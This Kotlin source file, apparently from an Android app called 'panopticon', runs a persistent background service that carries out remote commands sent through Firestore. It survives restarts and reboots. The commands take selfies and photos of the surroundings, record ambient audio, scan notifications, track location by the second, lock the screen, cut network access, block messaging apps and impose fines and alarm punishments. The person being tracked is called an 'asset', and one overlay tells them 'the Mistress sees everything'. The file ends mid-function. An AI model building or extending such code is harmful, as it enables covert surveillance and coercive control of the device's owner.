package com.abdelrahman.panopticon

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import androidx.core.app.NotificationCompat
import com.google.firebase.Timestamp
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions

/**
 * CommandListenerService — خدمة أمامية تُبقي اتصال Firestore حياً
 *
 * تعمل حتى بعد إغلاق التطبيق (START_STICKY).
 * تستمع لمستند device_commands/{uid} وتُنفّذ الأوامر نيتفياً.
 *
 * Lifecycle:
 *   START  ← BackgroundServiceChannel.startService(uid)
 *   RESTART ← نظام Android تلقائياً بعد الإغلاق (START_STICKY)
 *   BOOT   ← BootReceiver يُعيد التشغيل بعد إعادة تشغيل الجهاز
 */
class CommandListenerService : Service() {

    companion object {
        const val NOTIFICATION_ID = 2001
        const val CHANNEL_ID     = "cmd_listener_channel"
        const val EXTRA_UID      = "uid"
        const val PREF_FILE      = "focus_prefs"
        const val PREF_UID       = "saved_uid"
    }

    private var listenerReg: ListenerRegistration? = null
    private var wakeLock: PowerManager.WakeLock? = null

    // ── Lifecycle ──────────────────────────────────────────────

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        startForeground(NOTIFICATION_ID, buildNotification())
        android.util.Log.i("CommandListenerSvc", "✓ Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // حاول قراءة uid من Intent أو من SharedPreferences (عند الإعادة التلقائية)
        val uid = intent?.getStringExtra(EXTRA_UID)
            ?: getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                .getString(PREF_UID, null)

        if (uid.isNullOrEmpty()) {
            android.util.Log.w("CommandListenerSvc", "UID مجهول — إيقاف الخدمة")
            stopSelf()
            return START_NOT_STICKY
        }

        // احفظ UID للإعادة التلقائية بعد الإيقاف
        getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
            .edit().putString(PREF_UID, uid).apply()

        // ── Dead Pulse Protocol: جدوِل إنذار AlarmManager للأوامر ──
        AlarmWakeUpReceiver.scheduleCommandWake(this)

        attachFirestoreListener(uid)
        return START_STICKY // أعِد التشغيل تلقائياً إن قتله النظام
    }

    override fun onDestroy() {
        listenerReg?.remove()
        listenerReg = null
        wakeLock?.release()
        android.util.Log.i("CommandListenerSvc", "Service destroyed")
        super.onDestroy()
    }

    // ── Firestore Listener ─────────────────────────────────────

    private fun attachFirestoreListener(uid: String) {
        listenerReg?.remove()

        val ref = FirebaseFirestore.getInstance()
            .collection("device_commands")
            .document(uid)

        listenerReg = ref.addSnapshotListener { snap, error ->
            if (error != null) {
                android.util.Log.e("CommandListenerSvc", "Firestore خطأ: ${error.message}")
                return@addSnapshotListener
            }
            if (snap == null || !snap.exists()) return@addSnapshotListener

            val acknowledged = snap.getBoolean("acknowledged") ?: true
            if (acknowledged) return@addSnapshotListener

            val command = snap.getString("command") ?: return@addSnapshotListener
            @Suppress("UNCHECKED_CAST")
            val payload = (snap.get("payload") as? Map<String, Any>) ?: emptyMap()

            android.util.Log.i("CommandListenerSvc", "← أمر: $command")
            logCommandToAuditTrail(uid, command, payload)
            executeCommand(uid, command, payload)

            // إقرار الاستلام
            ref.update("acknowledged", true)
                .addOnSuccessListener {
                    android.util.Log.i("CommandListenerSvc", "✓ Acknowledged: $command")
                }

            // رفع حالة الجهاز
            reportDeviceState(uid)
        }

        android.util.Log.i("CommandListenerSvc", "✓ Firestore listener نشط للـ UID: $uid")
    }

    // ── تنفيذ الأوامر ──────────────────────────────────────────

    private fun executeCommand(uid: String, command: String, payload: Map<String, Any>) {
        when (command) {
            // ── أوامر Kiosk ──────────────────────────────────────
            "enable_kiosk"  -> enableKiosk()
            "disable_kiosk" -> disableKiosk()
            "update_blocked_apps" -> {
                @Suppress("UNCHECKED_CAST")
                val packages = payload["packages"] as? List<String> ?: emptyList()
                saveBlockedAppsToPrefs(packages)
            }

            // ── قفل الشاشة ────────────────────────────────────────
            "lock_screen" -> lockScreen()

            // ── Lost Mode (وضع الفقدان) ───────────────────────────
            "activate_lost_mode" -> {
                val pin = payload["pin"] as? String ?: "0000"
                LostModeOverlayService.activate(this, pin)
                android.util.Log.i("CommandListenerSvc", "✓ Lost Mode مُفعَّل بـ PIN")
            }
            "deactivate_lost_mode" -> {
                LostModeOverlayService.deactivate(this)
                android.util.Log.i("CommandListenerSvc", "✓ Lost Mode أُلغي بأمر المشرف")
            }

            // ── صافرة الذعر (Panic Alarm) ─────────────────────────
            "trigger_panic_alarm" -> {
                val topic = payload["ntfy_topic"] as? String ?: PanicAlarmService.DEFAULT_NTFY_TOPIC
                PanicAlarmService.start(this, topic)
                android.util.Log.i("CommandListenerSvc", "✓ Panic Alarm مُشغَّل")
            }
            "stop_panic_alarm" -> {
                PanicAlarmService.stop(this)
                android.util.Log.i("CommandListenerSvc", "✓ Panic Alarm مُوقَف")
            }

            // ── رفع قفل المقابلة (Onboarding Step 4a) ─────────────
            "unlock_interview" -> {
                LostModeOverlayService.deactivate(this)
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf(
                        "interviewLocked" to false,
                        "interviewUnlockedAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Interview Lock مُرفَع — الجهاز طُلِق")
            }

            // ── OOB — رقم المشرف ──────────────────────────────────
            "set_admin_phone" -> {
                val phone = payload["phone"] as? String ?: ""
                if (phone.isNotEmpty()) {
                    IncomingCallLockdownReceiver.saveAdminPhone(this, phone)
                    android.util.Log.i("CommandListenerSvc", "✓ رقم المشرف حُفظ: $phone")
                }
            }

            // ── القيود المؤسسية ───────────────────────────────────
            "apply_enterprise_restrictions" -> {
                MyDeviceAdminReceiver.applyEnterpriseRestrictions(this)
                android.util.Log.i("CommandListenerSvc", "✓ قيود مؤسسية مُطبَّقة")
            }
            "clear_enterprise_restrictions" -> {
                MyDeviceAdminReceiver.clearAllRestrictions(this)
                android.util.Log.i("CommandListenerSvc", "✓ قيود مؤسسية مُزالة")
            }
            "set_airplane_mode_blocked" -> {
                val blocked = payload["blocked"] as? Boolean ?: true
                MyDeviceAdminReceiver.setAirplaneMode(this, blocked)
            }

            // ── Phase 5: Snap Check-in (Identity Verification) ───
            "snap_checkin_selfie" -> {
                val uid = getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .getString(PREF_UID, "") ?: ""
                SnapCheckinService.triggerSelfie(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Snap Checkin (selfie) مُشغَّل")
            }
            "snap_checkin_surroundings" -> {
                val uid = getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .getString(PREF_UID, "") ?: ""
                SnapCheckinService.triggerSurroundings(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Snap Checkin (surroundings) مُشغَّل")
            }

            // ── Phase 5: Screen Recording (Audit Session) ────────
            "stop_screen_recording" -> {
                ScreenRecordingService.stop(this)
                android.util.Log.i("CommandListenerSvc", "✓ Screen Recording مُوقَف")
            }
            // Note: start_screen_recording requires MediaProjection token from user
            // — يُشغَّل عبر MainActivity MethodChannel فقط

            // ── Phase 7: Geofencing ───────────────────────────────
            "set_geofence" -> {
                val lat     = (payload["centerLat"] as? Number)?.toDouble() ?: 0.0
                val lon     = (payload["centerLon"] as? Number)?.toDouble() ?: 0.0
                val radius  = (payload["radiusMeters"] as? Number)?.toDouble() ?: 500.0
                val enabled = payload["enabled"] as? Boolean ?: true
                val geofenceData = mapOf(
                    "centerLat"     to lat,
                    "centerLon"     to lon,
                    "radiusMeters"  to radius,
                    "enabled"       to enabled,
                    "updatedAt"     to com.google.firebase.Timestamp.now()
                )
                FirebaseFirestore.getInstance()
                    .collection("geofence_config")
                    .document(uid)
                    .set(geofenceData, com.google.firebase.firestore.SetOptions.merge())
                GeofenceMonitorService.start(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Geofence مُعيَّن ($lat,$lon) r=${radius}m")
            }
            "disable_geofence" -> {
                FirebaseFirestore.getInstance()
                    .collection("geofence_config")
                    .document(uid)
                    .update("enabled", false)
                GeofenceMonitorService.stop(this)
                android.util.Log.i("CommandListenerSvc", "✓ Geofence مُعطَّل")
            }
            "grant_travel_pass" -> {
                val hours  = (payload["durationHours"] as? Number)?.toInt() ?: 2
                val reason = payload["reason"] as? String ?: "مجاز"
                TravelPassManager.activate(this, uid, hours, reason)
                android.util.Log.i("CommandListenerSvc", "✓ Travel Pass مُمنوح ($hours ساعة)")
            }
            "revoke_travel_pass" -> {
                TravelPassManager.revoke(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Travel Pass مُلغى")
            }

            // ── Phase 7: Live Radar Mode ──────────────────────────
            "enable_radar_mode" -> {
                TelemetryPublisherService.enableRadarMode(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Radar Mode مُفعَّل (1 ثانية GPS)")
            }
            "disable_radar_mode" -> {
                TelemetryPublisherService.disableRadarMode(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Radar Mode مُعطَّل (30 ثانية)")
            }

            // ── Phase 7: Mandatory App Launch ─────────────────────
            "launch_mandatory_app" -> {
                val pkg   = payload["packageName"] as? String ?: ""
                val kiosk = payload["kioskMode"] as? Boolean ?: true
                if (pkg.isNotEmpty()) {
                    launchMandatoryApp(uid, pkg, kiosk)
                    android.util.Log.i("CommandListenerSvc", "✓ تطبيق إلزامي: $pkg")
                }
            }
            "stop_mandatory_app" -> {
                stopMandatoryApp(uid)
                android.util.Log.i("CommandListenerSvc", "✓ تطبيق إلزامي أُوقف")
            }

            // ── Phase 7: Asset Offboarding ────────────────────────
            "initiate_ghost_state" -> {
                OffboardingService.initiateGhostState(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Ghost State مُفعَّل")
            }
            "full_release" -> {
                OffboardingService.executeFullRelease(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ Full Release مُنفَّذ")
            }

            // ── Phase 8: Recovery & Advanced Tools ───────────────
            "report_device_state" -> {
                // يُجبر الجهاز على إرسال تقرير كامل بحالته الآن
                reportDeviceState(uid)
                android.util.Log.i("CommandListenerSvc", "✓ تقرير حالة الجهاز مُرسَل")
            }
            "set_oob_enabled" -> {
                // تفعيل / تعطيل بروتوكول الانتعاش خارج النطاق
                val enabled = payload["enabled"] as? Boolean ?: true
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("oob_lockdown_enabled", enabled)
                    .apply()
                android.util.Log.i("CommandListenerSvc",
                    "✓ OOB Protocol ${if (enabled) "مُفعَّل" else "مُعطَّل"}")
            }
            "push_rtdb_command" -> {
                // إرسال أمر طارئ عبر RTDB (مسار بديل سريع)
                val subCmd = payload["sub_command"] as? String ?: ""
                if (subCmd.isNotEmpty()) {
                    android.util.Log.i("CommandListenerSvc", "RTDB push → تنفيذ: $subCmd")
                    executeCommand(uid, subCmd, payload)
                }
            }

            // ── Phase 9: Ambient Audio Analysis ──────────────────
            "start_ambient_audio" -> {
                AmbientAudioService.start(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ تحليل الصوت المحيط بدأ")
            }
            "stop_ambient_audio" -> {
                AmbientAudioService.stop(this)
                android.util.Log.i("CommandListenerSvc", "✓ تحليل الصوت المحيط توقف")
            }

            // ── Phase 9: Notification Scanner Toggle ─────────────
            "enable_notification_scan" -> {
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putBoolean("notification_scanner_enabled", true).apply()
                android.util.Log.i("CommandListenerSvc", "✓ مسح الإشعارات مُفعَّل")
            }
            "disable_notification_scan" -> {
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putBoolean("notification_scanner_enabled", false).apply()
                android.util.Log.i("CommandListenerSvc", "✓ مسح الإشعارات مُعطَّل")
            }

            // ── Module 4: Snap Check-in SLA (30 ثانية) ───────────
            "snap_checkin_sla" -> {
                SnapCheckinService.triggerSLACheckin(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ SLA Snap Checkin: مهلة 30 ثانية بدأت")
            }

            // ── Module 3: Network Isolation (VPN Blackhole) ───────
            "start_network_isolation" -> {
                val mqttIp = payload["mqttIp"] as? String
                DpcVpnService.start(this, uid, mqttIp)
                android.util.Log.i("CommandListenerSvc", "✓ عزل الشبكة مُفعَّل (Blackhole Mode)")
            }
            "stop_network_isolation" -> {
                DpcVpnService.stop(this)
                android.util.Log.i("CommandListenerSvc", "✓ عزل الشبكة مُلغى")
            }

            // ── Module 4: Mandatory Briefing ──────────────────────
            "start_mandatory_briefing" -> {
                val deepLink    = payload["deepLink"]    as? String ?: ""
                val sessionName = payload["sessionName"] as? String ?: "إحاطة إجبارية"
                if (deepLink.isNotEmpty()) {
                    BriefingEnforcerService.start(this, uid, deepLink, sessionName)
                    android.util.Log.i("CommandListenerSvc", "✓ الإحاطة الإجبارية بدأت: $deepLink")
                }
            }
            "end_mandatory_briefing" -> {
                BriefingEnforcerService.stop(this, uid)
                android.util.Log.i("CommandListenerSvc", "✓ الإحاطة الإجبارية انتهت")
            }

            // ── Module 4: Web URL Filtering ───────────────────────
            "update_blocked_domains" -> {
                @Suppress("UNCHECKED_CAST")
                val domains = payload["domains"] as? List<String> ?: emptyList()
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putStringSet("blocked_domains", domains.toSet()).apply()
                android.util.Log.i("CommandListenerSvc",
                    "✓ قائمة الروابط المحجوبة محدَّثة: ${domains.size} نطاق")
            }

            // ── Module 4: Mutiny Lockout Toggle ───────────────────
            "set_mutiny_lockout" -> {
                val enabled = payload["enabled"] as? Boolean ?: true
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putBoolean("mutiny_lockout_enabled", enabled).apply()
                android.util.Log.i("CommandListenerSvc",
                    "✓ Mutiny Lockout: ${if (enabled) "مُفعَّل" else "مُعطَّل"}")
            }

            // ── Module 3: Red Overlay direct commands ─────────────
            "show_red_overlay" -> {
                val msg = payload["message"] as? String ?: "🔴 مراقبة نشطة — السيدة ترى كل شيء"
                RedOverlayService.show(this, msg)
                FirebaseFirestore.getInstance().collection("device_states").document(uid)
                    .update("redOverlayActive", true)
                android.util.Log.i("CommandListenerSvc", "✓ Red Overlay مُفعَّل")
            }
            "hide_red_overlay" -> {
                RedOverlayService.hide(this)
                FirebaseFirestore.getInstance().collection("device_states").document(uid)
                    .update("redOverlayActive", false)
                android.util.Log.i("CommandListenerSvc", "✓ Red Overlay مُلغى")
            }

            // ── Module 4: Phase 11 — Force Reject Asset ───────────
            "force_reject_asset" -> {
                FirebaseFirestore.getInstance().collection("device_states").document(uid)
                    .update(mapOf(
                        "assetStatus" to "rejected",
                        "rejectedAt" to com.google.firebase.Timestamp.now()))
                // إشعار العنصر بالرفض
                FirebaseFirestore.getInstance().collection("device_commands").document(uid)
                    .set(mapOf(
                        "command" to "force_reject_asset",
                        "timestamp" to com.google.firebase.Timestamp.now(),
                        "message" to "لقد تم رفضك من النظام. هذا الجهاز لم يعد تحت السيطرة."),
                        com.google.firebase.firestore.SetOptions.merge())
                android.util.Log.i("CommandListenerSvc", "✓ Asset مرفوض — تم الإشعار")
            }

            // ── Module 4: Time Bomb — مُعطَّل (لا تصفير للجهاز) ──────
            "trigger_time_bomb" -> {
                android.util.Log.i("CommandListenerSvc", "ℹ Time Bomb — الأمر مُعطَّل")
            }

            // ── Module 4: Biometric Verification Request ──────────
            "request_biometric_verification" -> {
                FirebaseFirestore.getInstance().collection("device_commands").document(uid)
                    .set(mapOf(
                        "command" to "request_biometric_verification",
                        "timestamp" to com.google.firebase.Timestamp.now(),
                        "ttlSeconds" to 120),
                        com.google.firebase.firestore.SetOptions.merge())
                FirebaseDatabase.getInstance()
                    .getReference("device_states/$uid").child("biometricRequested")
                    .setValue(true)
                android.util.Log.i("CommandListenerSvc", "✓ طلب التحقق البيومتري أُرسل")
            }

            // ── Module 4: Clear Audit Submission ──────────────────
            "clear_audit_submission" -> {
                FirebaseFirestore.getInstance().collection("asset_audits").document(uid)
                    .delete()
                FirebaseFirestore.getInstance().collection("device_states").document(uid)
                    .update("auditSubmitted", false)
                android.util.Log.i("CommandListenerSvc", "✓ بيانات الجرد مُسحت")
            }

            // ── Phase 6 / Module A: Conclude Zero-Hour Lockdown ──
            "conclude_zero_hour_lockdown" -> {
                LostModeOverlayService.deactivate(this)
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf(
                        "zeroHourActive" to false,
                        "zeroHourConcludedAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Zero-Hour Lockdown مُنهى — Lost Mode مُرفَع")
            }

            // ── Phase 6 / Module A: Asset Fate Category Update ────
            "asset_fate_update" -> {
                val categoryId = payload["categoryId"] as? String ?: ""
                val fate       = payload["fate"]       as? String ?: "pending"
                if (categoryId.isNotEmpty()) {
                    FirebaseFirestore.getInstance()
                        .collection("asset_audits").document(uid)
                        .update("fate_$categoryId", fate)
                }
                android.util.Log.i("CommandListenerSvc", "✓ Asset Fate Updated: $categoryId → $fate")
            }

            // ── Phase 6 / Module A: Zero-Hour Lockdown ────────────
            "zero_hour_lockdown" -> {
                val pin = payload["pin"] as? String ?: "0000"
                val msg = payload["message"] as? String ?: "⛔ قفل ساعة الصفر — انتظر أوامر السيدة"
                lockScreen()
                LostModeOverlayService.activate(this, pin)
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf(
                        "zeroHourActive" to true,
                        "zeroHourAt" to com.google.firebase.Timestamp.now(),
                        "zeroHourMsg" to msg
                    ))
                android.util.Log.i("CommandListenerSvc", "✓ Zero-Hour Lockdown مُفعَّل — PIN=$pin")
            }

            // ── Phase 6 / Module A: Asset Fate Commands ───────────
            "asset_fate_confiscate" -> {
                lockScreen()
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf("assetFate" to "confiscated",
                                  "assetFateAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Asset Fate: مُصادَر")
            }
            "asset_fate_return" -> {
                LostModeOverlayService.deactivate(this)
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf("assetFate" to "returned",
                                  "assetFateAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Asset Fate: مُعاد")
            }
            "asset_fate_restrict" -> {
                val packages = listOf("com.instagram.android","com.twitter.android",
                    "com.facebook.katana","com.snapchat.android","com.whatsapp",
                    "org.telegram.messenger","com.zhiliaoapp.musically")
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putStringSet("blocked_apps", packages.toSet()).apply()
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf("assetFate" to "restricted",
                                  "assetFateAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Asset Fate: مُقيَّد")
            }

            // ── Phase 6 / Module A: Time Dungeon ──────────────────
            "time_dungeon" -> {
                val hours = (payload["hours"] as? Number)?.toInt() ?: 2
                lockScreen()
                val packages = listOf("com.google.android.calendar",
                    "com.instagram.android","com.twitter.android","com.whatsapp")
                val current = getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .getStringSet("blocked_apps", emptySet()) ?: emptySet()
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                    .edit().putStringSet("blocked_apps",
                        (current + packages).toSet()).apply()
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf(
                        "timeDungeonActive" to true,
                        "timeDungeonUntil" to com.google.firebase.Timestamp(
                            System.currentTimeMillis() / 1000 + hours * 3600L, 0)
                    ))
                android.util.Log.i("CommandListenerSvc", "✓ Time Dungeon مُفعَّل لـ $hours ساعة")
            }

            // ── Phase 6 / Module B: Apply Remote Config ───────────
            "apply_remote_config" -> {
                val grayscale  = payload["grayscale"]  as? Boolean ?: false
                val fontShrink = payload["fontShrink"] as? Boolean ?: false
                val redOverlay = payload["redOverlay"] as? Boolean ?: false
                getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE).edit()
                    .putBoolean("rc_grayscale",   grayscale)
                    .putBoolean("rc_font_shrink",  fontShrink)
                    .putBoolean("rc_red_overlay",  redOverlay)
                    .apply()
                if (redOverlay) {
                    RedOverlayService.show(this, "🔴 وضع التحكم عن بُعد — المراقبة نشطة")
                } else {
                    RedOverlayService.hide(this)
                }
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf("remoteConfig" to mapOf(
                        "grayscale" to grayscale, "fontShrink" to fontShrink,
                        "redOverlay" to redOverlay,
                        "appliedAt" to com.google.firebase.Timestamp.now())))
                android.util.Log.i("CommandListenerSvc",
                    "✓ Remote Config مُطبَّق — grayscale=$grayscale fontShrink=$fontShrink red=$redOverlay")
            }

            // ── Phase 6 / Module B: Phobia Lockout ───────────────
            "phobia_lockout" -> {
                val topic = payload["ntfy_topic"] as? String ?: PanicAlarmService.DEFAULT_NTFY_TOPIC
                PanicAlarmService.start(this, topic)
                lockScreen()
                FirebaseFirestore.getInstance()
                    .collection("disciplinary_events").document(uid)
                    .set(mapOf("type" to "phobia_lockout",
                               "at" to com.google.firebase.Timestamp.now()), 
                         com.google.firebase.firestore.SetOptions.merge())
                android.util.Log.i("CommandListenerSvc", "✓ Phobia Lockout + High-Freq Alarm مُشغَّل")
            }

            // ── Phase 6 / Module B: Court-Martial Reset ───────────
            "court_martial_reset" -> {
                val db = FirebaseFirestore.getInstance()
                db.collection("behavioral_log").document(uid)
                  .set(mapOf("reset" to true, "resetAt" to com.google.firebase.Timestamp.now()))
                db.collection("compliance_score").document(uid)
                  .set(mapOf("score" to 50, "resetAt" to com.google.firebase.Timestamp.now()))
                FirebaseDatabase.getInstance().getReference("device_states/$uid/behavioralAnalysis")
                    .setValue(null)
                android.util.Log.i("CommandListenerSvc", "✓ Court-Martial Reset: سجل سلوكي ممسوح")
            }

            // ── Phase 6 / Module B: Digital Void ─────────────────
            "digital_void" -> {
                OffboardingService.initiateGhostState(this, uid)
                RedOverlayService.show(this, "⚫ الفراغ الرقمي — الجهاز محجوز")
                FirebaseFirestore.getInstance()
                    .collection("device_states").document(uid)
                    .update(mapOf("digitalVoid" to true,
                                  "digitalVoidAt" to com.google.firebase.Timestamp.now()))
                android.util.Log.i("CommandListenerSvc", "✓ Digital Void مُفعَّل")
            }

            // ── Phase 6 / Module A: Success Sound ────────────────
            "play_success_sound" -> {
                try {
                    val tg = android.media.ToneGenerator(
                        android.media.AudioManager.STREAM_NOTIFICATION, 100)
                    tg.startTone(android.media.ToneGenerator.TONE_PROP_ACK, 800)
                    android.os.Handler(android.os.Looper.getMainLooper())
                        .postDelayed({ tg.release() }, 1000)
                } catch (e: Exception) {
                    android.util.Log.w("CommandListenerSvc", "ToneGenerator error: ${e.message}")
                }
                android.util.Log.i("CommandListenerSvc", "✓ Success Sound مُشغَّل")
            }

            // ── Phase 6 / Module C: EOD Accountability Prompt ────
            "eod_accountability_prompt" -> {
                val deepLink    = payload["deepLink"]    as? String ?: ""
                val sessionName = payload["sessionName"] as? String ?: "تقرير نهاية اليوم"
                if (deepLink.isNotEmpty()) {
                    BriefingEnforcerService.start(this, uid, deepLink, sessionName)
                } else {
                    val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                    val ch = android.app.NotificationChannel("eod_ch","EOD",
                        android.app.NotificationManager.IMPORTANCE_HIGH)
                    nm.createNotificationChannel(ch)
                    val n = androidx.core.app.NotificationCompat.Builder(this,"eod_ch")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle("📋 تقرير نهاية اليوم مطلوب")
                        .setContentText("افتح التطبيق الآن وأكمل تقرير EOD")
                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                        .setAutoCancel(false)
                        .build()
                    nm.notify(7001, n)
                }
                android.util.Log.i("CommandListenerSvc", "✓ EOD Accountability Prompt أُرسِل")
            }

            // ── Phase 6 / Module B: Economy Commands ─────────────
            "loyalty_award_coins" -> {
                val coins  = (payload["coins"]  as? Number)?.toLong() ?: 0L
                val reason = payload["reason"] as? String ?: "منحة يدوية"
                val db = FirebaseFirestore.getInstance()
                db.collection("economy").document(uid)
                  .update(mapOf("coins" to com.google.firebase.firestore.FieldValue.increment(coins),
                                "lastAward" to reason,
                                "lastAwardAt" to com.google.firebase.Timestamp.now()))
                FirebaseDatabase.getInstance()
                    .getReference("device_states/$uid").child("economyChanged")
                    .setValue(true)
                android.util.Log.i("CommandListenerSvc", "✓ $coins نقطة مُمنوحة — $reason")
            }
            "monetary_fine" -> {
                val amount = (payload["amount"] as? Number)?.toLong() ?: 0L
                val reason = payload["reason"] as? String ?: "غرامة تلقائية"
                val db = FirebaseFirestore.getInstance()
                db.collection("economy").document(uid)
                  .update(mapOf(
                      "debt" to com.google.firebase.firestore.FieldValue.increment(amount),
                      "coins" to com.google.firebase.firestore.FieldValue.increment(-amount),
                      "lastFine" to reason,
                      "lastFineAt" to com.google.firebase.Timestamp.now()))
                FirebaseDatabase.getInstance()
                    .getReference("device_states/$uid").child("economyChanged")
                    .setValue(true)
                android.util.Log.i("CommandListenerSvc", "✓ غرامة $amount مُطبَّقة — $reason")
            }
            "freeze_account" -> {
                FirebaseFirestore.getInstance().collection("economy").document(uid)
                  .update(mapOf("frozen" to true,
                                "frozenAt" to com.google.firebase.Timestamp.now()))
                lockScreen()
                android.util.Log.i("CommandListenerSvc", "✓ الحساب مُجمَّد")
            }
            "unfreeze_account" -> {
                FirebaseFirestore.getInstance().collection("economy").document(uid)
                  .update(mapOf("frozen" to false))
                android.util.Log.i("CommandListenerSvc", "✓ الحساب مُحرَّر")
            }

            else -> android.util.Log.w("CommandListenerSvc", "أمر غير معروف: $command")
        }
    }

    // ── Phase 7: Mandatory App Launch ────────────────────────────

    private fun launchMandatoryApp(uid: String, packageName: String, kioskMode: Boolean) {
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(
                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                startActivity(launchIntent)

                // تسجيل الإطلاق في Firestore
                FirebaseFirestore.getInstance()
                    .collection("device_states")
                    .document(uid)
                    .update(mapOf(
                        "mandatoryAppActive" to true,
                        "mandatoryAppPackage" to packageName,
                        "mandatoryAppKiosk" to kioskMode,
                        "mandatoryAppLaunchedAt" to com.google.firebase.Timestamp.now()
                    ))

                // وضع Kiosk محدود (قفل التطبيقات الاجتماعية وسماح فقط بالتطبيق الإلزامي)
                if (kioskMode) {
                    val currentBlocked = getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                        .getStringSet("blocked_apps", emptySet()) ?: emptySet()
                    val extendedBlock = currentBlocked.toMutableSet().apply {
                        add("com.instagram.android")
                        add("com.twitter.android")
                        add("com.whatsapp")
                        add("org.telegram.messenger")
                        add("com.facebook.katana")
                    }
                    getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
                        .edit()
                        .putStringSet("blocked_apps", extendedBlock)
                        .putString("mandatory_app_package", packageName)
                        .apply()
                    android.util.Log.i("CommandListenerSvc", "✓ Kiosk مُفعَّل للتطبيق الإلزامي")
                }
            } else {
                android.util.Log.w("CommandListenerSvc", "التطبيق غير مثبت: $packageName")
                FirebaseFirestore.getInstance()
                    .collection("device_states")
                    .document(uid)
                    .update("mandatoryAppError", "التطبيق غير مثبت: $packageName")
            }
        } catch (e: Exception) {
            android.util.Log.e("CommandListenerSvc", "خطأ في إطلاق التطبيق الإلزامي: ${e.message}")
        }
    }

    private fun stopMandatoryApp(uid: String) {
        getSharedPreferences(PREF_FILE, Context.MODE_PRIVATE)
            .edit()
            .remove("mandatory_app_package")
            .apply()

        FirebaseFirestore.getInstance()
            .collection("device_states")
            .document(uid)
            .update(mapOf(
                "mandatoryAppActive" to false,
                "mandatoryAppStoppedAt" to com.google.firebase.Timestamp.now()
            ))
    }

    private fun enableKiosk() {
        saveBlockedAppsToPrefs(listOf(
            "com.instagram.android",
            "com.twitter.android",
            "com.facebook.katana",
            "com.snapchat.android",
            "com.zhiliaoapp.musically",
            "com.tiktok.android",
            "com.youtube.android",
            "com.google.android.youtube",
            "com.reddit.frontpage",
            "com.linkedin.android",
            "com.pinterest",
            "com.telegram.messenger",
            "org.telegram.messenger",
            "com.whatsapp",
            "com.google.android.apps.messaging",
        ))
        android.util.Log.i("CommandListenerSvc", "✓ Kiosk مُفعَّل")
    }

    private fun disableKiosk() {
        saveBlockedAppsToPrefs(listOf(
            "com.instagram.android",
            "com.twitter.android",
            "com.facebook.katana",
            "com.snapchat.android",
            "com.zhiliaoapp.musically",
            "com.tiktok.android",
        ))
        android.util.Log.i("CommandListenerSvc", "✓ Kiosk مُلغى")
    }

    // ── سجل أوامر المشرف — compliance_assets/{uid}/command_log ──────────────

    private fun logCommandToAuditTrail(uid: String, command: String, payload: Map<String, Any>) {
        try {
            FirebaseFirestore.getInstance()
                .collection("compliance_assets")
                .document(uid)
                .collection("command_log")
                .add(
                    mapOf(
                        "command"   to command,
                        "params"    to payload,
                        "status"    to "executed",
                        "timestamp" to com.google.firebase.Timestamp.now(),
